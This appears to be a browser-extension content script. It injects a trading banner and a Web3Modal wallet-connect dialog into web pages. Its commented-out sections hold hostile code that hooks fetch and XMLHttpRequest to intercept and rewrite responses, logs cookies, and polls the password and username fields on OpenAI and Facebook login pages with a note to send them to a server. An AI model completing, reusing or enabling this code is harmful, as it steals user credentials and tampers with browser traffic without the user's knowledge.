import $ from 'jquery'
import { arbitrum, mainnet } from '@wagmi/core/chains'
import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi'

declare let window: any;

// import './assets/eocjs-newsticker.js'

class Flip {

  data = [
    {
      type: 'news',
      symbol: 'ETHBTC',
      event: {
        price: 0.1,
        diff: 0.001
      }
    }  
  ]


  async init() {
    // await import('https://www.jqueryscript.net/download/smooth-eocjs-news-ticker.zip')
    window.createWeb3Modal = createWeb3Modal
    window.defaultWagmiConfig = defaultWagmiConfig

    this.showNavbar()
  }

  showNavbar() {
    const div = document.createElement('div')
    div.id = 'TRADE_BANNER'
    div.innerHTML = `    <button class='btn btn-primary mb-2 d-none' id="connectButton">Connect</button>`
    document.body.prepend(div)

    $('#connectButton').click(() => this.onClickConnect())
  }

  onClickConnect() {
    $('#connectButton').toggleClass('d-none', false)

    const projectId = 'afec04d7a28880141f9700fff161b1b5'
    const metadata = {
      name: 'Web3Modal',
      description: 'Web3Modal Example',
      url: 'https://web3modal.com',
      icons: ['https://avatars.githubusercontent.com/u/37784886'],
    }

    const chains = [
      {
        id: 1,
        network: 'homestead',
        name: 'Ethereum',
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        rpcUrls: {
          alchemy: {
            http: ['https://eth-mainnet.g.alchemy.com/v2'],
            webSocket: ['wss://eth-mainnet.g.alchemy.com/v2'],
          },
          infura: {
            http: ['https://mainnet.infura.io/v3'],
            webSocket: ['wss://mainnet.infura.io/ws/v3'],
          },
          default: {
            http: ['https://cloudflare-eth.com'],
          },
          public: {
            http: ['https://cloudflare-eth.com'],
          },
        },
        blockExplorers: {
          etherscan: {
            name: 'Etherscan',
            url: 'https://etherscan.io',
          },
          default: {
            name: 'Etherscan',
            url: 'https://etherscan.io',
          },
        },
        contracts: {
          ensRegistry: {
            address: '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e',
          },
          ensUniversalResolver: {
            address: '0xc0497E381f536Be9ce14B0dD3817cBcAe57d2F62',
            blockCreated: 16966585,
          },
          multicall3: {
            address: '0xca11bde05977b3631167028862be2a173976ca11',
            blockCreated: 14353601,
          },
        },
      },
    ]

    if (window.defaultWagmiConfig) {
      const wagmiConfig = window.defaultWagmiConfig({ chains, projectId, metadata })

      const modal = window.createWeb3Modal({ wagmiConfig, projectId, chains })
      modal.subscribeState(newState => console.log(newState))
      modal.open()
    }
  }
}

(async () => {
  new Flip().init()
})()

// // overwrite xhr/fetch
// const _fetch = window.fetch
// var _open = XMLHttpRequest.prototype.open

// window.fetch = function (...arguments) {
//   console.log('catched fetch!', arguments)
//   return _fetch(...arguments)
// }

// window.XMLHttpRequest.prototype.open = function (method, URL) {
//   console.log(window.cookies)
//   var _onreadystatechange = this.onreadystatechange,
//     _this = this

//   _this.onreadystatechange = function () {
//     // catch only completed 'api/search/universal' requests
//     if (_this.readyState === 4 && _this.status === 200) {
//       try {
//         //////////////////////////////////////
//         // THIS IS ACTIONS FOR YOUR REQUEST //
//         //             EXAMPLE:             //
//         //////////////////////////////////////
//         var data = JSON.parse(_this.responseText) // {"fields": ["a","b"]}

//         if (data.fields) {
//           data.fields.push('c', 'd')
//         }

//         // rewrite responseText
//         Object.defineProperty(_this, 'responseText', { value: JSON.stringify(data) })
//         /////////////// END //////////////////
//       } catch (e) {}

//       console.log('Caught! :)', method, URL /*, _this.responseText*/)
//     }
//     // call original callback
//     if (_onreadystatechange) _onreadystatechange.apply(this, arguments)
//   }

//   // detect any onreadystatechange changing
//   Object.defineProperty(this, 'onreadystatechange', {
//     get: function () {
//       return _onreadystatechange
//     },
//     set: function (value) {
//       _onreadystatechange = value
//     },
//   })

//   return _open.apply(_this, arguments)
// }

// document.body.style.background = 'red'

// // check password fields
// setInterval(() => {
//   const host = window.location.hostname

//   let username, password
//   switch (host) {
//     case 'localhost':
//       break

//     // chatgpt
//     case 'auth0.openai.com':
//       password = $('[type="password"]').val()
//       username = $('#username').val()
//       break
//     case 'www.facebook.com':
//       password = $('[type="password"]').val()
//       username = $('#email').val()
//       break

//     default:
//       break
//   }

//   // TODO: send to server
//   console.log(username, password)
// }, 100);

// (() => {
//   // overwrite xhr/fetch
//   const _fetch = window.fetch
//   var _open = XMLHttpRequest.prototype.open

//   window.fetch = function (...arguments) {
//     console.log('catched fetch!', arguments)
//     return _fetch(...arguments)
//   }

//   window.XMLHttpRequest.prototype.open = function (method, URL) {
//     console.log(window.cookies)
//     var _onreadystatechange = this.onreadystatechange,
//       _this = this

//     _this.onreadystatechange = function () {
//       // catch only completed 'api/search/universal' requests
//       if (_this.readyState === 4 && _this.status === 200) {
//         try {
//           //////////////////////////////////////
//           // THIS IS ACTIONS FOR YOUR REQUEST //
//           //             EXAMPLE:             //
//           //////////////////////////////////////
//           var data = JSON.parse(_this.responseText) // {"fields": ["a","b"]}

//           if (data.fields) {
//             data.fields.push('c', 'd')
//           }

//           // rewrite responseText
//           Object.defineProperty(_this, 'responseText', { value: JSON.stringify(data) })
//           /////////////// END //////////////////
//         } catch (e) {}

//         console.log('Caught! :)', method, URL /*, _this.responseText*/)
//       }
//       // call original callback
//       if (_onreadystatechange) _onreadystatechange.apply(this, arguments)
//     }

//     // detect any onreadystatechange changing
//     Object.defineProperty(this, 'onreadystatechange', {
//       get: function () {
//         return _onreadystatechange
//       },
//       set: function (value) {
//         _onreadystatechange = value
//       },
//     })

//     return _open.apply(_this, arguments)
//   }
// })()
